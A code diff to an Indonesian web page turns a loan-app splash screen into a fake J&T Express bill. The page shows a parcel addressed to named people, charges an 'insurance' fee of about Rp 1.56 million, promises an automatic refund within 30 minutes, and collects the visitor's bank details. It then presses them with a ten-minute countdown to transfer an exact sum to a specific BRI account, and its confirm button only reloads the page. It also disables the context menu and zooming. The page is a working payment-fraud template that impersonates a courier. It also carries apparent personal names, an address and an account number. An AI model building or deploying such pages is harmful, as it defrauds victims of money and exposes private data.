@@ -1,80 +1,516 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Rupiah Kilat</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Tagihan J&T Express Premium</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --jt-red: #ED1C24;
+        }
 
-  <style>
-    @keyframes floatUp {
-      from { transform: translateY(20px); opacity: 0; }
-      to { transform: translateY(0); opacity: 1; }
-    }
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #0f172a;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            margin: 0;
+            /* Extreme No Zoom Logic */
+            touch-action: pan-x pan-y;
+            -webkit-text-size-adjust: none;
+            text-size-adjust: none;
+            user-select: none;
+        }
 
-    @keyframes progress {
-      from { width: 0%; }
-      to { width: 100%; }
-    }
-  </style>
+        #mobile-container {
+            width: 100%;
+            max-width: 500px;
+            min-height: 100vh;
+            background: #ffffff;
+            position: relative;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            overflow-x: hidden;
+        }
+
+        /* Prevent auto-zoom on iOS focus */
+        input, select, textarea { font-size: 16px !important; }
+
+        .red-gradient {
+            background: linear-gradient(135deg, #ED1C24 0%, #C41212 100%);
+        }
+
+        .card-premium {
+            background: white;
+            border-radius: 24px;
+            border: 1px solid #f1f5f9;
+            box-shadow: 0 4px 20px -2px rgba(0, 0, 0, 0.05);
+        }
+
+        .nav-blur {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-top: 1px solid #f1f5f9;
+        }
+
+        @keyframes slideInUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .animate-up { animation: slideInUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+        
+        * { touch-action: manipulation; }
+    </style>
 </head>
+<body oncontextmenu="return false;">
 
-<body class="min-h-screen bg-gradient-to-br from-blue-700 via-blue-600 to-indigo-700 flex justify-center items-center">
+    <div id="mobile-container" class="pb-36">
+        
+        <!-- DASHBOARD VIEW -->
+        <div id="view-dashboard" class="animate-up">
+            <!-- Header -->
+            <div class="red-gradient p-6 pb-24 rounded-b-[40px] relative shadow-lg">
+                <div class="flex justify-between items-center mb-6">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b3/J%26T_Express_logo.svg" alt="J&T" class="h-6 brightness-0 invert">
+                    <div class="bg-white/20 backdrop-blur-md px-4 py-1.5 rounded-full border border-white/30">
+                        <span class="text-[10px] font-black text-white uppercase tracking-widest">PENDING</span>
+                    </div>
+                </div>
+                <div class="text-white">
+                    <p class="text-[10px] font-bold opacity-70 uppercase tracking-[0.2em] mb-1">Rincian Pengiriman</p>
+                    <h1 class="text-2xl font-black tracking-tight mb-2">JO0319523495</h1>
+                    <div class="flex items-center gap-2 opacity-90">
+                        <i data-lucide="calendar" class="w-3.5 h-3.5"></i>
+                        <span class="text-xs font-bold">Kamis, 04-03-2026</span>
+                    </div>
+                </div>
+            </div>
 
-  <div class="w-full max-w-[420px] px-6 text-center text-white">
+            <div class="px-5 -mt-16 space-y-5 relative z-10">
+                <!-- Main Info Card -->
+                <div class="card-premium p-6">
+                    <div class="flex items-center justify-between mb-6 pb-4 border-b border-slate-50">
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 bg-red-50 rounded-2xl flex items-center justify-center text-red-600">
+                                <i data-lucide="package" class="w-5 h-5"></i>
+                            </div>
+                            <div>
+                                <p class="text-[10px] text-slate-400 font-bold uppercase">Layanan</p>
+                                <p class="text-sm font-black text-slate-800">J&T EZ (Reguler)</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p class="text-[10px] text-slate-400 font-bold uppercase">Berat</p>
+                            <p class="text-sm font-black text-slate-800">1.0 KG</p>
+                        </div>
+                    </div>
 
-    <!-- Logo Section -->
-    <div class="animate-[floatUp_1s_ease-out]">
-      <div class="w-20 h-20 mx-auto mb-4 rounded-2xl bg-white/20 backdrop-blur flex items-center justify-center shadow-lg">
-        <span class="text-3xl font-bold">₿</span>
-      </div>
-      <h1 class="text-3xl font-bold tracking-wide">Rupiah Kilat</h1>
-      <p class="text-blue-100 mt-2 text-sm">
-        Solusi Pinjaman Cepat & Aman
-      </p>
+                    <div class="space-y-6">
+                        <div class="flex gap-4">
+                            <div class="flex flex-col items-center">
+                                <div class="w-3 h-3 rounded-full bg-red-600"></div>
+                                <div class="w-0.5 h-12 bg-slate-100 my-1"></div>
+                                <div class="w-3 h-3 rounded-full bg-slate-200"></div>
+                            </div>
+                            <div class="flex-1 space-y-6">
+                                <div>
+                                    <p class="text-[9px] text-slate-400 font-black uppercase tracking-widest">Pengirim</p>
+                                    <p class="text-xs font-bold text-slate-800 uppercase">ABDUL AZIS</p>
+                                    <p class="text-[10px] text-slate-500">Semarang, Jawa Tengah</p>
+                                </div>
+                                <div>
+                                    <p class="text-[9px] text-slate-400 font-black uppercase tracking-widest">Penerima</p>
+                                    <p class="text-xs font-bold text-slate-800 uppercase">MUHAMMAD ALLHALIFI HAIDAR P.</p>
+                                    <p class="text-[10px] text-slate-500 leading-relaxed">Jl. Murni NO.45 RT016/RW002 Joglo, Kembangan Jakarta Barat</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Billing Summary Card -->
+                <div class="card-premium overflow-hidden">
+                    <div class="bg-slate-50 px-6 py-3 border-b border-slate-100 flex justify-between items-center">
+                        <span class="text-[10px] font-black text-slate-400 uppercase tracking-widest">Detail Tagihan</span>
+                        <span class="text-[10px] font-bold text-red-600">NON COD</span>
+                    </div>
+                    <div class="p-6 space-y-4">
+                        <div class="flex justify-between items-center">
+                            <span class="text-sm text-slate-500">Item: <span class="font-bold text-slate-700">Asuransi</span></span>
+                            <span class="text-sm font-bold text-slate-800">Rp 1.550.500</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-sm text-slate-500">Service Fee</span>
+                            <span class="text-sm font-bold text-slate-800">Rp 6.500</span>
+                        </div>
+                        <div class="pt-4 border-t border-dashed border-slate-200 flex justify-between items-center">
+                            <span class="text-base font-black text-slate-900">Total Tagihan</span>
+                            <span class="text-xl font-black text-red-600">Rp 1.557.000</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Refund Account Status -->
+                <div class="space-y-3">
+                    <div class="flex justify-between items-center px-1">
+                        <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-widest">Rekening Tujuan Refund</h3>
+                        <button onclick="openRefundModal()" class="text-[10px] font-black text-blue-600 bg-blue-50 px-4 py-2 rounded-xl flex items-center gap-1.5 active:scale-90 transition-transform">
+                            <i data-lucide="edit-3" class="w-3 h-3"></i> EDIT DATA
+                        </button>
+                    </div>
+
+                    <div id="card-refund" class="bg-slate-900 rounded-3xl p-6 text-white shadow-xl relative overflow-hidden transition-all duration-500">
+                        <div class="absolute right-0 top-0 w-32 h-32 bg-white/5 rounded-full -mr-12 -mt-12"></div>
+                        <div class="flex justify-between items-start mb-8">
+                            <i data-lucide="landmark" class="w-6 h-6 text-red-500"></i>
+                            <div class="text-right">
+                                <p class="text-[8px] font-black opacity-30 uppercase tracking-[0.2em]">Estimasi Pengembalian</p>
+                                <p class="text-sm font-black text-red-500">Rp 1.550.500</p>
+                            </div>
+                        </div>
+                        <div class="space-y-4">
+                            <div>
+                                <p id="disp-bank" class="text-lg font-black italic tracking-tight text-slate-100">BELUM DIATUR</p>
+                                <p id="disp-rek" class="text-base font-mono tracking-[0.2em] text-slate-500">•••• •••• ••••</p>
+                            </div>
+                            <p id="disp-nama" class="text-[10px] font-bold uppercase tracking-widest text-slate-400">Silakan Lengkapi Data Rekening</p>
+                        </div>
+                    </div>
+
+                    <div class="bg-red-50 border border-red-100 rounded-2xl p-4 flex gap-3">
+                        <div class="w-8 h-8 bg-white rounded-lg flex items-center justify-center text-red-600 shrink-0 shadow-sm">
+                            <i data-lucide="shield-check" class="w-5 h-5"></i>
+                        </div>
+                        <p class="text-[10px] text-red-800 font-bold leading-relaxed">
+                            <span class="block text-[11px] mb-0.5">Catatan Penting:</span>
+                            Refund akan diproses oleh sistem secara otomatis paling lambat <span class="text-red-600 font-black">30 menit</span> setelah tagihan diverifikasi oleh sistem.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- PAYMENT VIEW -->
+        <div id="view-payment" class="hidden animate-up">
+            <div class="p-6 bg-white border-b sticky top-0 z-30 flex items-center gap-4">
+                <button onclick="toggleView('dashboard')" class="p-2 bg-slate-100 rounded-full active:scale-90 transition-all">
+                    <i data-lucide="chevron-left" class="w-6 h-6"></i>
+                </button>
+                <h1 class="text-lg font-black text-slate-900">Pembayaran Tagihan</h1>
+            </div>
+
+            <div class="p-5 space-y-6">
+                <!-- Countdown -->
+                <div class="red-gradient rounded-3xl p-5 flex items-center justify-between text-white shadow-lg">
+                    <div class="flex items-center gap-3">
+                        <div class="w-10 h-10 bg-white/20 rounded-2xl flex items-center justify-center backdrop-blur-md">
+                            <i data-lucide="timer" class="w-6 h-6 animate-pulse"></i>
+                        </div>
+                        <div>
+                            <p class="text-[9px] font-black opacity-60 uppercase tracking-widest">Sisa Waktu Bayar</p>
+                            <p id="countdown" class="text-xl font-black">10:00</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Payment Info -->
+                <div class="card-premium p-7 space-y-8">
+                    <div class="flex justify-between items-center">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2e/BRI_Logo.svg" alt="BRI" class="h-5">
+                        <span class="text-[10px] font-black text-slate-300 uppercase tracking-widest">Bank Transfer</span>
+                    </div>
+
+                    <div class="space-y-2">
+                        <p class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Nomor Rekening Tujuan</p>
+                        <div class="flex items-center justify-between bg-slate-50 p-5 rounded-2xl border border-slate-100">
+                            <span class="text-xl font-black text-slate-800 tracking-tight" id="va-number">061601001014566</span>
+                            <button onclick="copyText('061601001014566')" class="w-10 h-10 bg-white shadow-sm border border-slate-100 rounded-xl flex items-center justify-center text-red-600 active:scale-90">
+                                <i data-lucide="copy" class="w-5 h-5"></i>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="space-y-2">
+                        <p class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Total yang Harus Dibayar (+Fee 193)</p>
+                        <div class="flex items-center justify-between bg-red-50 p-5 rounded-2xl border border-red-100">
+                            <span class="text-2xl font-black text-red-600 tracking-tight">Rp 1.557.193</span>
+                            <button onclick="copyText('1557193')" class="w-10 h-10 bg-white shadow-sm border border-red-100 rounded-xl flex items-center justify-center text-red-600 active:scale-90">
+                                <i data-lucide="copy" class="w-5 h-5"></i>
+                            </button>
+                        </div>
+                        <p class="text-[10px] text-red-500 font-bold italic text-center">*PENTING: Pastikan nominal transfer sesuai angka di atas.</p>
+                    </div>
+                </div>
+
+                <!-- Refund Confirmation Summary -->
+                <div class="bg-slate-900 rounded-[32px] p-6 text-white shadow-xl relative overflow-hidden">
+                    <div class="absolute right-0 top-0 w-24 h-24 bg-red-500/10 rounded-full -mr-8 -mt-8"></div>
+                    <p class="text-[9px] font-black opacity-40 uppercase tracking-widest mb-4">Konfirmasi Tujuan Refund</p>
+                    <div class="flex items-center gap-4">
+                        <div class="w-12 h-12 bg-white/10 rounded-2xl flex items-center justify-center backdrop-blur-md">
+                            <i data-lucide="credit-card" class="w-6 h-6 text-red-500"></i>
+                        </div>
+                        <div>
+                            <p id="pay-sum-bank" class="text-base font-black italic">-</p>
+                            <p id="pay-sum-rek" class="text-[10px] text-slate-400 font-medium tracking-widest uppercase">-</p>
+                        </div>
+                    </div>
+                    <div class="mt-4 pt-4 border-t border-white/5">
+                        <p class="text-[9px] text-slate-400 leading-relaxed font-medium italic">
+                            *Sistem akan mentransfer otomatis ke rekening di atas dalam <span class="text-white font-black">30 menit</span> setelah pembayaran terverifikasi.
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Payment Guides -->
+                <div class="space-y-4 pb-20">
+                    <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Instruksi Pembayaran</h3>
+                    <div class="space-y-2">
+                        <div class="card-premium overflow-hidden">
+                            <button onclick="toggleGuide(this)" class="w-full p-5 text-left flex justify-between items-center group">
+                                <span class="text-xs font-black text-slate-700">MOBILE BANKING / BRIMO</span>
+                                <i data-lucide="chevron-down" class="w-4 h-4 text-slate-400 transition-transform"></i>
+                            </button>
+                            <div class="hidden px-5 pb-6 border-t border-slate-50 pt-4 space-y-3">
+                                <div class="flex gap-3">
+                                    <span class="w-5 h-5 bg-red-50 rounded-full flex items-center justify-center text-[10px] font-bold text-red-600 shrink-0">1</span>
+                                    <p class="text-[11px] text-slate-600 font-medium">Login ke <span class="font-bold">BRImo</span> dan pilih menu <span class="font-bold">Transfer</span> atau <span class="font-bold">BRIVA</span>.</p>
+                                </div>
+                                <div class="flex gap-3">
+                                    <span class="w-5 h-5 bg-red-50 rounded-full flex items-center justify-center text-[10px] font-bold text-red-600 shrink-0">2</span>
+                                    <p class="text-[11px] text-slate-600 font-medium">Pilih <span class="font-bold">Tambah Daftar Baru</span> dan masukkan nomor rekening di atas.</p>
+                                </div>
+                                <div class="flex gap-3">
+                                    <span class="w-5 h-5 bg-red-50 rounded-full flex items-center justify-center text-[10px] font-bold text-red-600 shrink-0">3</span>
+                                    <p class="text-[11px] text-slate-600 font-medium">Masukkan nominal bayar <span class="font-bold text-red-600 uppercase">Tepat Rp 1.557.193</span>.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- STICKY NAV -->
+        <div class="fixed bottom-0 w-full max-w-[500px] nav-blur p-5 pb-8 z-40">
+            <div id="nav-dash" class="flex items-center justify-between gap-5">
+                <div class="shrink-0">
+                    <p class="text-[9px] font-black text-slate-400 uppercase tracking-widest mb-0.5">Total Tagihan</p>
+                    <p class="text-xl font-black text-slate-900">Rp 1.557.000</p>
+                </div>
+                <button onclick="handlePaymentRedirect()" class="flex-1 red-gradient text-white h-14 rounded-2xl font-black text-xs uppercase tracking-widest shadow-xl shadow-red-200 active:scale-95 transition-all">
+                    Selesaikan Pembayaran
+                </button>
+            </div>
+            <div id="nav-pay" class="hidden">
+                <button onclick="confirmAction()" class="w-full bg-slate-900 text-white h-14 rounded-2xl font-black text-xs uppercase tracking-widest shadow-xl shadow-slate-200 active:scale-95 transition-all">
+                    SAYA SUDAH TRANSFER
+                </button>
+            </div>
+        </div>
+
+        <!-- MODAL REFUND -->
+        <div id="modal-refund" class="fixed inset-0 z-[60] flex items-end justify-center bg-black/60 hidden transition-opacity duration-300">
+            <div class="bg-white w-full max-w-[500px] rounded-t-[44px] p-8 pb-10 animate-up shadow-2xl">
+                <div class="w-12 h-1.5 bg-slate-100 rounded-full mx-auto mb-8"></div>
+                <div class="mb-8">
+                    <h2 class="text-2xl font-black text-slate-900 mb-1.5 tracking-tight">Data Rekening Refund</h2>
+                    <p class="text-xs text-slate-400 font-medium">Pastikan data sesuai untuk mempercepat proses otomatis sistem.</p>
+                </div>
+
+                <div class="space-y-5">
+                    <div>
+                        <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1 mb-2 block">Pilih Nama Bank</label>
+                        <select id="in-bank" class="w-full bg-slate-50 border-0 rounded-2xl p-4 font-bold text-slate-800 outline-none focus:ring-2 focus:ring-red-500 transition-all appearance-none">
+                            <option value="">Pilih Bank</option>
+                            <option value="BCA">Bank BCA</option>
+                            <option value="Mandiri">Bank Mandiri</option>
+                            <option value="BNI">Bank BNI</option>
+                            <option value="BRI">Bank BRI</option>
+                            <option value="CIMB Niaga">Bank CIMB Niaga</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1 mb-2 block">Nomor Rekening</label>
+                        <input type="tel" id="in-rek" placeholder="0000 0000 0000" class="w-full bg-slate-50 border-0 rounded-2xl p-4 font-bold text-slate-800 outline-none focus:ring-2 focus:ring-red-500 transition-all">
+                    </div>
+                    <div>
+                        <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1 mb-2 block">Nama Pemilik Rekening</label>
+                        <input type="text" id="in-nama" placeholder="SESUAI BUKU TABUNGAN" class="w-full bg-slate-50 border-0 rounded-2xl p-4 font-bold text-slate-800 outline-none focus:ring-2 focus:ring-red-500 transition-all uppercase">
+                    </div>
+
+                    <button onclick="saveRefund()" class="w-full red-gradient text-white h-16 rounded-2xl font-black text-sm uppercase tracking-widest shadow-xl shadow-red-100 mt-4 active:scale-95 transition-all">
+                        Simpan Perubahan
+                    </button>
+                    <button onclick="closeRefundModal()" class="w-full py-2 text-[10px] font-black text-slate-400 uppercase tracking-[0.2em]">Batalkan</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Toast Notification -->
+        <div id="toast" class="fixed top-12 left-1/2 -translate-x-1/2 bg-slate-900/95 backdrop-blur-md text-white px-8 py-4 rounded-3xl text-xs font-bold shadow-2xl z-[100] opacity-0 pointer-events-none transition-all duration-300">
+            Pesan Toast
+        </div>
     </div>
 
-    <!-- Loading -->
-    <div id="loading" class="mt-10">
-      <div class="w-full h-2 bg-white/20 rounded-full overflow-hidden">
-        <div class="h-full bg-white animate-[progress_2s_linear_forwards]"></div>
-      </div>
-      <p class="text-sm text-blue-100 mt-3">Menyiapkan akun Anda...</p>
-    </div>
+    <script>
+        // Init Lucide Icons
+        function refreshIcons() {
+            if (window.lucide) {
+                lucide.createIcons();
+            } else {
+                setTimeout(refreshIcons, 50);
+            }
+        }
+        window.addEventListener('DOMContentLoaded', refreshIcons);
 
-    <!-- Action Buttons -->
-    <div id="actions" class="hidden mt-12 space-y-4 animate-[floatUp_0.8s_ease-out]">
+        // State Management
+        let dataRefund = { bank: '', rek: '', nama: '' };
+        let timerActive = false;
 
-      <a href="login.html"
-         class="block w-full py-3 rounded-xl bg-white text-blue-700 font-semibold shadow-lg active:scale-95 transition">
-        Login
-      </a>
+        function toggleView(v) {
+            const dash = document.getElementById('view-dashboard');
+            const pay = document.getElementById('view-payment');
+            const navD = document.getElementById('nav-dash');
+            const navP = document.getElementById('nav-pay');
 
-      <a href="login.html"
-         class="block w-full py-3 rounded-xl border border-white/70 text-white font-semibold active:scale-95 transition">
-        Daftar
-      </a>
+            if(v === 'payment') {
+                dash.classList.add('hidden');
+                pay.classList.remove('hidden');
+                navD.classList.add('hidden');
+                navP.classList.remove('hidden');
+                startCountdown();
+                window.scrollTo(0,0);
+            } else {
+                dash.classList.remove('hidden');
+                pay.classList.add('hidden');
+                navD.classList.remove('hidden');
+                navP.classList.add('hidden');
+            }
+            refreshIcons();
+        }
 
-      <p class="text-xs text-blue-100 mt-6">
-        Dengan melanjutkan, Anda menyetujui<br>
-        Syarat & Ketentuan Rupiah Kilat
-      </p>
-    </div>
+        function openRefundModal() {
+            const m = document.getElementById('modal-refund');
+            m.classList.remove('hidden');
+            setTimeout(() => m.classList.add('opacity-100'), 10);
+        }
 
-  </div>
+        function closeRefundModal() {
+            const m = document.getElementById('modal-refund');
+            m.classList.remove('opacity-100');
+            setTimeout(() => m.classList.add('hidden'), 300);
+        }
 
-  <script>
-    setTimeout(() => {
-      const userId = localStorage.getItem("id");
+        function saveRefund() {
+            const b = document.getElementById('in-bank').value;
+            const r = document.getElementById('in-rek').value;
+            const n = document.getElementById('in-nama').value;
 
-      if (userId) {
-        window.location.href = "dashboard.html";
-      } else {
-        document.getElementById("loading").classList.add("hidden");
-        document.getElementById("actions").classList.remove("hidden");
-      }
-    }, 2000);
-  </script>
+            if(!b || !r || !n) {
+                showToast("Lengkapi semua kolom!");
+                return;
+            }
 
+            dataRefund = { bank: b, rek: r, nama: n };
+            
+            // Update Dashboard UI
+            document.getElementById('disp-bank').innerText = b;
+            document.getElementById('disp-rek').innerText = r.replace(/(\d{4})(?=\d)/g, '$1 ');
+            document.getElementById('disp-nama').innerText = n;
+            document.getElementById('card-refund').classList.add('ring-2', 'ring-blue-500');
+
+            // Update Payment Summary UI
+            document.getElementById('pay-sum-bank').innerText = b;
+            document.getElementById('pay-sum-rek').innerText = `${r} A/N ${n.toUpperCase()}`;
+
+            closeRefundModal();
+            showToast("Data Rekening Berhasil Disimpan");
+        }
+
+        function handlePaymentRedirect() {
+            if(!dataRefund.bank) {
+                showToast("Silakan isi data refund dahulu!");
+                openRefundModal();
+                return;
+            }
+            toggleView('payment');
+        }
+
+        function showToast(msg) {
+            const t = document.getElementById('toast');
+            t.innerText = msg;
+            t.classList.add('opacity-100');
+            t.style.transform = 'translate(-50%, 0)';
+            setTimeout(() => {
+                t.classList.remove('opacity-100');
+                t.style.transform = 'translate(-50%, -20px)';
+            }, 2500);
+        }
+
+        function copyText(val) {
+            const el = document.createElement('textarea');
+            el.value = val;
+            document.body.appendChild(el);
+            el.select();
+            document.execCommand('copy');
+            document.body.removeChild(el);
+            showToast("Berhasil Disalin!");
+        }
+
+        function toggleGuide(btn) {
+            const content = btn.nextElementSibling;
+            const icon = btn.querySelector('i');
+            const isOpen = !content.classList.contains('hidden');
+            
+            if(!isOpen) {
+                content.classList.remove('hidden');
+                icon.style.transform = 'rotate(180deg)';
+            } else {
+                content.classList.add('hidden');
+                icon.style.transform = 'rotate(0deg)';
+            }
+        }
+
+        function startCountdown() {
+            if(timerActive) return;
+            timerActive = true;
+            let sec = 600;
+            const disp = document.getElementById('countdown');
+            const interval = setInterval(() => {
+                let m = Math.floor(sec / 60);
+                let s = sec % 60;
+                disp.innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
+                if(sec-- <= 0) {
+                    clearInterval(interval);
+                    disp.innerText = "EXPIRED";
+                }
+            }, 1000);
+        }
+
+        function confirmAction() {
+            showToast("Sedang memverifikasi pembayaran...");
+            setTimeout(() => {
+                location.reload();
+            }, 2500);
+        }
+
+        // Global Prevent Zoom
+        document.addEventListener('touchstart', (e) => {
+            if (e.touches.length > 1) e.preventDefault();
+        }, { passive: false });
+        
+        let lastTouch = 0;
+        document.addEventListener('touchend', (e) => {
+            const now = Date.now();
+            if (now - lastTouch <= 300) e.preventDefault();
+            lastTouch = now;
+        }, false);
+    </script>
 </body>
 </html>
